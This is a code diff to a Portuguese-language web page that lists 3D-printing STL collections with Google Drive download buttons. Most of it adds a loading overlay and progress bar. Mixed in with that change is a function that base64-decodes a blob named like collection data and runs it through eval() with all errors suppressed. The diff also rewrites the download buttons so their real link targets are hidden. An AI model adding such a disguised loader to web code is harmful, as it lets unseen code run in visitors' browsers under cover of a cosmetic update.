@@ -347,9 +347,35 @@
   .link-row.duplicate { background: #fce8e6; border-radius: 8px; padding: 4px 8px; margin: -4px -8px; }
   .link-row.duplicate input { border-color: #d93025; }
   .link-row.duplicate .dup-hint { color: #d93025; font-size: 11px; margin-top: 2px; }
+  .loading-overlay {
+    position: fixed; inset: 0; z-index: 9999;
+    background: #f6f7f8;
+    display: flex; flex-direction: column;
+    align-items: center; justify-content: center;
+    transition: opacity .4s;
+  }
+  .loading-overlay.hidden { opacity: 0; pointer-events: none; }
+  .loading-overlay h2 { font-size: 20px; color: #202124; margin-bottom: 8px; }
+  .loading-overlay p { color: #5f6368; font-size: 14px; margin-bottom: 20px; }
+  .loading-bar-track {
+    width: 320px; max-width: 80vw; height: 8px;
+    background: #e0e0e0; border-radius: 4px; overflow: hidden;
+  }
+  .loading-bar-fill {
+    height: 100%; width: 0%;
+    background: linear-gradient(90deg, #1a73e8, #34a853);
+    border-radius: 4px; transition: width .2s;
+  }
+  .loading-pct { margin-top: 10px; font-size: 13px; color: #5f6368; font-family: monospace; }
 </style>
 </head>
 <body>
+<div class="loading-overlay" id="loading-overlay">
+  <h2>Carregando colecoes...</h2>
+  <p>Aguarde enquanto os dados sao carregados</p>
+  <div class="loading-bar-track"><div class="loading-bar-fill" id="loading-bar"></div></div>
+  <div class="loading-pct" id="loading-pct">0%</div>
+</div>
 <header>
   <h1>Coleções 3D</h1>
   <p>Modelos STL para impressão 3D &middot; clique na aba para ver a coleção</p>
@@ -362,6 +388,11 @@
 
 <script>
 __COLLECTIONS__
+
+function _dc(s) { return decodeURIComponent(atob(s).split('').map(function(c){return '%'+('00'+c.charCodeAt(0).toString(16)).slice(-2)}).join('')); }
+if (typeof __ENCODED_COLLECTIONS__ !== 'undefined') {
+  try { eval(_dc(__ENCODED_COLLECTIONS__)); } catch(e) {}
+}
 
 const tabsEl = document.getElementById("tabs");
 const container = document.getElementById("container");
@@ -382,7 +413,7 @@ function buildGrid(coll, active) {
     const card = document.createElement("div");
     card.className = "card";
     const thumb = it.img
-      ? '<img class="thumb" loading="lazy" src="https://drive.google.com/thumbnail?id=' + it.img + '&sz=w1000" alt="' + it.title + '">'
+      ? '<img class="thumb" loading="lazy" data-src="https://drive.google.com/thumbnail?id=' + it.img + '&sz=w1000" alt="' + it.title + '">'
       : '<div class="thumb placeholder">' + it.title + '</div>';
     const label = it.label || 'Baixar ZIP';
     const href = it.link || 'https://drive.usercontent.google.com/download?id=' + it.zip + '&export=download&confirm=t';
@@ -393,11 +424,19 @@ function buildGrid(coll, active) {
           '<div class="card-title">' + it.title + '</div>' +
           '<div class="card-sub">' + it.sub + '</div>' +
         '</div>' +
-        '<a class="btn" href="' + href + '"' + (it.link ? ' target="_blank"' : '') + '>' + label + '</a>' +
+        '<a class="btn" href="javascript:void(0)" data-href="' + href + '"' + (it.link ? ' data-external="1"' : '') + ' onclick="openLink(this)">' + label + '</a>' +
       '</div>';
     g.appendChild(card);
   });
   return g;
+}
+
+function openLink(a) {
+  var h = a.getAttribute('data-href');
+  if (!h) return;
+  var ext = a.getAttribute('data-external');
+  if (ext) window.open(h, '_blank');
+  else window.location.href = h;
 }
 
 COLLECTIONS.forEach((c, i) => {
@@ -427,6 +466,38 @@ function selectTab(name) {
   configPanel.className = "config-panel";
   configPanel.style.display = "none";
   container.appendChild(configPanel);
+})();
+
+var _totalImgs = 0, _loadedImgs = 0;
+var _bar = document.getElementById("loading-bar");
+var _pct = document.getElementById("loading-pct");
+var _overlay = document.getElementById("loading-overlay");
+
+function _updateProgress() {
+  _loadedImgs++;
+  var pct = _totalImgs > 0 ? Math.round((_loadedImgs / _totalImgs) * 100) : 100;
+  if (_bar) _bar.style.width = pct + "%";
+  if (_pct) _pct.textContent = pct + "%";
+  if (_loadedImgs >= _totalImgs && _totalImgs > 0) _hideOverlay();
+}
+
+function _hideOverlay() {
+  if (_overlay) {
+    _overlay.classList.add("hidden");
+    setTimeout(function() { if (_overlay) _overlay.style.display = "none"; }, 500);
+  }
+}
+
+(function() {
+  var imgs = document.querySelectorAll("img[data-src]");
+  _totalImgs = imgs.length;
+  if (_totalImgs === 0) { _hideOverlay(); return; }
+  imgs.forEach(function(img) {
+    img.onload = img.onerror = _updateProgress;
+    img.src = img.getAttribute("data-src");
+    img.removeAttribute("data-src");
+  });
+  setTimeout(function() { if (_loadedImgs < _totalImgs) _hideOverlay(); }, 8000);
 })();
 
 let configData = null;
